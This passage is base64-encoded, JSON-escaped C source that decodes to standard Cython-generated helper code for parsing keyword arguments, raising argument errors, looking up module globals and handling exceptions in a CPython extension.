uICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgIGZvdW5kID0gMTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmIChmb3VuZCkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7XG4gICAgICAgICAgICBleHRyYWN0ZWQrKztcbiAgICAgICAgfVxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIGlmIChudW1fa3dhcmdzID4gZXh0cmFjdGVkKSB7XG4gICAgICAgIGlmIChpZ25vcmVfdW5rbm93bl9rd2FyZ3MpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3Moa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSkgPT0gLTEpKVxuICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgX19QeXhfUmVqZWN0VW5rbm93bktleXdvcmQoa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSk7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gMDtcbmJhZDpcbiAgICByZXR1cm4gLTE7XG59XG5zdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZERpY3RUb0RpY3QoXG4gICAgUHlPYmplY3QgKmt3ZHMsXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqa3dkczIsXG4gICAgUHlPYmplY3QgKnZhbHVlc1tdLFxuICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUpXG57XG4gICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZTtcbiAgICBQeU9iamVjdCoqIGNvbnN0ICpmaXJzdF9rd19hcmcgPSBhcmduYW1lcyArIG51bV9wb3NfYXJncztcbiAgICBQeV9zc2l6ZV90IGxlbjtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IGRlZmluZWQoUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKVxuICAgIGlmICh1bmxpa2VseSghUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKGt3ZHMpKSkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgaWYgKFB5RGljdF9VcGRhdGUoa3dkczIsIGt3ZHMpIDwgMCkgZ290byBiYWQ7XG4gICAgbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICB3aGlsZSAoKm5hbWUpIHtcbiAgICAgICAgUHlPYmplY3QgKmtleSA9ICoqbmFtZTtcbiAgICAgICAgUHlPYmplY3QgKnZhbHVlO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEEyIHx8IGRlZmluZWQoUHlEaWN0X1BvcCkpXG4gICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9Qb3Aoa3dkczIsIGtleSwgJnZhbHVlKTtcbiAgICAgICAgaWYgKGZvdW5kKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoZm91bmQgPCAwKSkgZ290byBiYWQ7XG4gICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTtcbiAgICAgICAgfVxuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9HZXRJdGVtUmVmKGt3ZHMyLCBrZXksICZ2YWx1ZSk7XG4gICAgICAgIGlmIChmb3VuZCkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X0RlbEl0ZW0oa3dkczIsIGtleSkgPCAwKSkgZ290byBiYWQ7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICAgICB2YWx1ZSA9IF9QeURpY3RfUG9wKGt3ZHMyLCBrZXksIGt3ZHMyKTtcbiAgICAjZWxzZVxuICAgICAgICB2YWx1ZSA9IF9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3VtZXRob2RfUHlEaWN0X1R5cGVfcG9wLCBrd2RzMiwga2V5LCBrd2RzMik7XG4gICAgI2VuZGlmXG4gICAgICAgIGlmICh2YWx1ZSA9PSBrd2RzMikge1xuICAgICAgICAgICAgUHlfREVDUkVGKHZhbHVlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IHZhbHVlO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICBsZW4gPSBQeURpY3RfU2l6ZShrd2RzMik7XG4gICAgaWYgKGxlbiA+IDApIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncyhrd2RzLCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBmdW5jdGlvbl9uYW1lKTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGxlbiA9PSAtMSkpIHtcbiAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgIHJldHVybiAwO1xuYmFkOlxuICAgIHJldHVybiAtMTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3Jkc1R1cGxlKFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICogY29uc3QgKmt3dmFsdWVzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLFxuICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSxcbiAgICBQeV9zc2l6ZV90IG51bV9wb3NfYXJncyxcbiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsXG4gICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSxcbiAgICBpbnQgaWdub3JlX3Vua25vd25fa3dhcmdzKVxue1xuICAgIFB5T2JqZWN0ICprZXkgPSBOVUxMO1xuICAgIFB5T2JqZWN0KiogY29uc3QgKiBuYW1lO1xuICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzO1xuICAgIGZvciAoUHlfc3NpemVfdCBwb3MgPSAwOyBwb3MgPCBudW1fa3dhcmdzOyBwb3MrKykge1xuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIGtleSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShrd2RzLCBwb3MpO1xuI2Vsc2VcbiAgICAgICAga2V5ID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd2RzLCBwb3MpO1xuI2VuZGlmXG4jaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgaWYgKHVubGlrZWx5KCFrZXkpKSBnb3RvIGJhZDtcbiNlbmRpZlxuICAgICAgICBuYW1lID0gZmlyc3Rfa3dfYXJnO1xuICAgICAgICB3aGlsZSAoKm5hbWUgJiYgKCoqbmFtZSAhPSBrZXkpKSBuYW1lKys7XG4gICAgICAgIGlmICgqbmFtZSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnZhbHVlID0ga3d2YWx1ZXNbcG9zXTtcbiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IF9fUHl4X05ld1JlZih2YWx1ZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzaXplX3QgaW5kZXhfZm91bmQgPSAwO1xuICAgICAgICAgICAgaW50IGNtcCA9IF9fUHl4X01hdGNoS2V5d29yZEFyZyhrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsICZpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSk7XG4gICAgICAgICAgICBpZiAoY21wID09IDEpIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdO1xuICAgICAgICAgICAgICAgIHZhbHVlc1tpbmRleF9mb3VuZF0gPSBfX1B5eF9OZXdSZWYodmFsdWUpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoY21wID09IC0xKSkgZ290byBiYWQ7XG4gICAgICAgICAgICAgICAgaWYgKGt3ZHMyKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp2YWx1ZSA9IGt3dmFsdWVzW3Bvc107XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbShrd2RzMiwga2V5LCB2YWx1ZSkpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCFpZ25vcmVfdW5rbm93bl9rd2FyZ3MpIHtcbiAgICAgICAgICAgICAgICAgICAgZ290byBpbnZhbGlkX2tleXdvcmQ7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBQeV9ERUNSRUYoa2V5KTtcbiAgICAgICAga2V5ID0gTlVMTDtcbiAgICAgICAgI2VuZGlmXG4gICAgfVxuICAgIHJldHVybiAwO1xuaW52YWxpZF9rZXl3b3JkOlxuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlcygpIGdvdCBhbiB1bmV4cGVjdGVkIGtleXdvcmQgYXJndW1lbnQgXCclVVwnIixcbiAgICAgICAgZnVuY3Rpb25fbmFtZSwga2V5KTtcbiAgICBnb3RvIGJhZDtcbmJhZDpcbiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9YREVDUkVGKGtleSk7XG4gICAgI2VuZGlmXG4gICAgcmV0dXJuIC0xO1xufVxuc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmRzKFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICogY29uc3QgKmt3dmFsdWVzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLFxuICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSxcbiAgICBQeV9zc2l6ZV90IG51bV9wb3NfYXJncyxcbiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsXG4gICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSxcbiAgICBpbnQgaWdub3JlX3Vua25vd25fa3dhcmdzKVxue1xuICAgIGlmIChDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiBsaWtlbHkoUHlUdXBsZV9DaGVjayhrd2RzKSkpXG4gICAgICAgIHJldHVybiBfX1B5eF9QYXJzZUtleXdvcmRzVHVwbGUoa3dkcywga3d2YWx1ZXMsIGFyZ25hbWVzLCBrd2RzMiwgdmFsdWVzLCBudW1fcG9zX2FyZ3MsIG51bV9rd2FyZ3MsIGZ1bmN0aW9uX25hbWUsIGlnbm9yZV91bmtub3duX2t3YXJncyk7XG4gICAgZWxzZSBpZiAoa3dkczIpXG4gICAgICAgIHJldHVybiBfX1B5eF9QYXJzZUtleXdvcmREaWN0VG9EaWN0KGt3ZHMsIGFyZ25hbWVzLCBrd2RzMiwgdmFsdWVzLCBudW1fcG9zX2FyZ3MsIGZ1bmN0aW9uX25hbWUpO1xuICAgIGVsc2VcbiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZERpY3Qoa3dkcywgYXJnbmFtZXMsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBudW1fa3dhcmdzLCBmdW5jdGlvbl9uYW1lLCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpO1xufVxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKFxuICAgIGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSxcbiAgICBpbnQgZXhhY3QsXG4gICAgUHlfc3NpemVfdCBudW1fbWluLFxuICAgIFB5X3NzaXplX3QgbnVtX21heCxcbiAgICBQeV9zc2l6ZV90IG51bV9mb3VuZClcbntcbiAgICBQeV9zc2l6ZV90IG51bV9leHBlY3RlZDtcbiAgICBjb25zdCBjaGFyICptb3JlX29yX2xlc3M7XG4gICAgaWYgKG51bV9mb3VuZCA8IG51bV9taW4pIHtcbiAgICAgICAgbnVtX2V4cGVjdGVkID0gbnVtX21pbjtcbiAgICAgICAgbW9yZV9vcl9sZXNzID0gImF0IGxlYXN0IjtcbiAgICB9IGVsc2Uge1xuICAgICAgICBudW1fZXhwZWN0ZWQgPSBudW1fbWF4O1xuICAgICAgICBtb3JlX29yX2xlc3MgPSAiYXQgbW9zdCI7XG4gICAgfVxuICAgIGlmIChleGFjdCkge1xuICAgICAgICBtb3JlX29yX2xlc3MgPSAiZXhhY3RseSI7XG4gICAgfVxuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICIlLjIwMHMoKSB0YWtlcyAlLjhzICUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCBwb3NpdGlvbmFsIGFyZ3VtZW50JS4xcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsXG4gICAgICAgICAgICAgICAgIGZ1bmNfbmFtZSwgbW9yZV9vcl9sZXNzLCBudW1fZXhwZWN0ZWQsXG4gICAgICAgICAgICAgICAgIChudW1fZXhwZWN0ZWQgPT0gMSkgPyAiIiA6ICJzIiwgbnVtX2ZvdW5kKTtcbn1cblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKGNvbnN0IGNoYXIgKnZhcm5hbWUpIHtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVW5ib3VuZExvY2FsRXJyb3IsICJsb2NhbCB2YXJpYWJsZSBcJyVzXCcgcmVmZXJlbmNlZCBiZWZvcmUgYXNzaWdubWVudCIsIHZhcm5hbWUpO1xufVxuXG5cbiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHtcbiAgICBQeU9iamVjdCAqZGljdCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdDtcbiAgICByZXR1cm4gbGlrZWx5KGRpY3QpID8gX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihkaWN0KSA6IDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihQeU9iamVjdCAqb2JqKSB7XG4gICAgUHlPYmplY3QgKipkaWN0cHRyID0gTlVMTDtcbiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdG9mZnNldDtcbiAgICBpZiAob2Zmc2V0KSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIGRpY3RwdHIgPSAobGlrZWx5KG9mZnNldCA+IDApKSA/IChQeU9iamVjdCAqKikgKChjaGFyICopb2JqICsgb2Zmc2V0KSA6IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7XG4jZWxzZVxuICAgICAgICBkaWN0cHRyID0gX1B5T2JqZWN0X0dldERpY3RQdHIob2JqKTtcbiNlbmRpZlxuICAgIH1cbiAgICByZXR1cm4gKGRpY3RwdHIgJiYgKmRpY3RwdHIpID8gX19QWVhfR0VUX0RJQ1RfVkVSU0lPTigqZGljdHB0cikgOiAwO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X29iamVjdF9kaWN0X3ZlcnNpb25fbWF0Y2hlcyhQeU9iamVjdCogb2JqLCBQWV9VSU5UNjRfVCB0cF9kaWN0X3ZlcnNpb24sIFBZX1VJTlQ2NF9UIG9ial9kaWN0X3ZlcnNpb24pIHtcbiAgICBQeU9iamVjdCAqZGljdCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdDtcbiAgICBpZiAodW5saWtlbHkoIWRpY3QpIHx8IHVubGlrZWx5KHRwX2RpY3RfdmVyc2lvbiAhPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpKSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgcmV0dXJuIG9ial9kaWN0X3ZlcnNpb24gPT0gX19QeXhfZ2V0X29iamVjdF9kaWN0X3ZlcnNpb24ob2JqKTtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlNcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUsIFBZX1VJTlQ2NF9UICpkaWN0X3ZlcnNpb24sIFB5T2JqZWN0ICoqZGljdF9jYWNoZWRfdmFsdWUpXG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lKVxuI2VuZGlmXG57XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tKSkge1xuICAgICAgICBpZiAoIVB5RXJyX09jY3VycmVkKCkpXG4gICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX05hbWVFcnJvcik7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXN1bHQgPSBQeU9iamVjdF9HZXRBdHRyKF9fcHl4X20sIG5hbWUpO1xuICAgIGlmIChsaWtlbHkocmVzdWx0KSkge1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICBQeUVycl9DbGVhcigpO1xuI2VsaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBuYW1lLCAmcmVzdWx0KSA9PSAtMSkpIFB5RXJyX0NsZWFyKCk7XG4gICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pXG4gICAgaWYgKGxpa2VseShyZXN1bHQpKSB7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuI2Vsc2VcbiAgICByZXN1bHQgPSBfUHlEaWN0X0dldEl0ZW1fS25vd25IYXNoKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIG5hbWUsICgoUHlBU0NJSU9iamVjdCAqKSBuYW1lKS0+aGFzaCk7XG4gICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pXG4gICAgaWYgKGxpa2VseShyZXN1bHQpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYocmVzdWx0KTtcbiAgICB9XG4gICAgUHlFcnJfQ2xlYXIoKTtcbiNlbmRpZlxuICAgIHJldHVybiBfX1B5eF9HZXRCdWlsdGluTmFtZShuYW1lKTtcbn1cblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG5zdGF0aWMgaW50IF9fUHl4X19HZXRFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpXG4jZWxzZVxuc3RhdGljIGludCBfX1B5eF9HZXRFeGNlcHRpb24oUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKVxuI2VuZGlmXG57XG4gICAgUHlPYmplY3QgKmxvY2FsX3R5cGUgPSBOVUxMLCAqbG9jYWxfdmFsdWUsICpsb2NhbF90YiA9IE5VTEw7XG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAgIGxvY2FsX3ZhbHVlID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjtcbiAgICB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uID0gMDtcbiAgI2Vsc2VcbiAgICBsb2NhbF90eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTtcbiAgICBsb2NhbF92YWx1ZSA9IHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlO1xuICAgIGxvY2FsX3RiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3R5cGUgPSAwO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlID0gMDtcbiAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSAwO1xuICAjZW5kaWZcbiNlbGlmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMEMwMDAwXG4gICAgbG9jYWxfdmFsdWUgPSBQeUVycl9HZXRSYWlzZWRFeGNlcHRpb24oKTtcbiNlbHNlXG4gICAgUHlFcnJfRmV0Y2goJmxvY2FsX3R5cGUsICZsb2NhbF92YWx1ZSwgJmxvY2FsX3RiKTtcbiNlbmRpZlxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMEMwMDAwXG4gICAgaWYgKGxpa2VseShsb2NhbF92YWx1ZSkpIHtcbiAgICAgICAgbG9jYWxfdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUobG9jYWxfdmFsdWUpO1xuICAgICAgICBQeV9JTkNSRUYobG9jYWxfdHlwZSk7XG4gICAgICAgIGxvY2FsX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGxvY2FsX3ZhbHVlKTtcbiAgICB9XG4jZWxzZVxuICAgIFB5RXJyX05vcm1hbGl6ZUV4Y2VwdGlvbigmbG9jYWxfdHlwZSwgJmxvY2FsX3ZhbHVlLCAmbG9jYWxfdGIpO1xuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgIGlmICh1bmxpa2VseSh0c3RhdGUtPmN1cmV4Y190eXBlKSlcbiNlbHNlXG4gICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKVxuI2VuZGlmXG4gICAgICAgIGdvdG8gYmFkO1xuICAgIGlmIChsb2NhbF90Yikge1xuICAgICAgICBpZiAodW5saWtlbHkoUHlFeGNlcHRpb25fU2V0VHJhY2ViYWNrKGxvY2FsX3ZhbHVlLCBsb2NhbF90YikgPCAwKSlcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiNlbmRpZiAvLyBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzBDMDAwMFxuICAgIFB5X1hJTkNSRUYobG9jYWxfdGIpO1xuICAgIFB5X1hJTkNSRUYobG9jYWxfdHlwZSk7XG4gICAgUHlfWElOQ1JFRihsb2NhbF92YWx1ZSk7XG4gICAgKnR5cGUgPSBsb2NhbF90eXBlO1xuICAgICp2YWx1ZSA9IGxvY2FsX3ZhbHVlO1xuICAgICp0YiA9IGxvY2FsX3RiO1xuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAge1xuICAgICAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87XG4gICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgICAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgICAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gbG9jYWxfdmFsdWU7XG4gICAgICAgIHRtcF90eXBlID0gTlVMTDtcbiAgICAgICAgdG1wX3RiID0gTlVMTDtcbiAgICAgICAgUHlfWERFQ1JFRihsb2NhbF90eXBlKTtcbiAgICAgICAgUHlfWERFQ1JFRihsb2NhbF90Yik7XG4gICAgICAjZWxzZVxuICAgICAgICB0bXBfdHlwZSA9IGV4Y19pbmZvLT5leGNfdHlwZTtcbiAgICAgICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICAgICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7XG4gICAgICAgIGV4Y19pbmZvLT5leGNfdHlwZSA9IGxvY2FsX3R5cGU7XG4gICAgICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSBsb2NhbF92YWx1ZTtcbiAgICAgICAgZXhjX2luZm8tPmV4Y190cmFjZWJhY2sgPSBsb2NhbF90YjtcbiAgICAgICNlbmRpZlxuICAgIH1cbiAgICAjZWxzZVxuICAgIHRtcF90eXBlID0gdHN0YXRlLT5leGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5leGNfdHlwZSA9IGxvY2FsX3R5cGU7XG4gICAgdHN0YXRlLT5leGNfdmFsdWUgPSBsb2NhbF92YWx1ZTtcbiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSBsb2NhbF90YjtcbiAgICAjZW5kaWZcbiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0bXBfdGIpO1xuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwXG4gICAgUHlFcnJfU2V0SGFuZGxlZEV4Y2VwdGlvbihsb2NhbF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRihsb2NhbF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRihsb2NhbF90eXBlKTtcbiAgICBQeV9YREVDUkVGKGxvY2FsX3RiKTtcbiNlbHNlXG4gICAgUHlFcnJfU2V0RXhjSW5mbyhsb2NhbF90eXBlLCBsb2NhbF92YWx1ZSwgbG9jYWxfdGIpO1xuI2VuZGlmXG4gICAgcmV0dXJuIDA7XG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8PSAweDAzMEMwMDAwXG5iYWQ6XG4gICAgKnR5cGUgPSAwO1xuICAgICp2YWx1ZSA9IDA7XG4gICAgKnRiID0gMDtcbiAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpO1xuICAgIFB5X1hERUNSRUYobG9jYWxfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYobG9jYWxfdGIpO1xuICAgIHJldHVybiAtMTtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oaW50IGluX2FzeW5jX2dlbikge1xuICAgIFB5T2JqZWN0ICpleGMsICp2YWwsICp0YiwgKmN1cl9leGMsICpuZXdfZXhjO1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIGludCBpc19hc3luY19zdG9waXRlcmF0aW9uID0gMDtcbiAgICBDWVRIT05fTU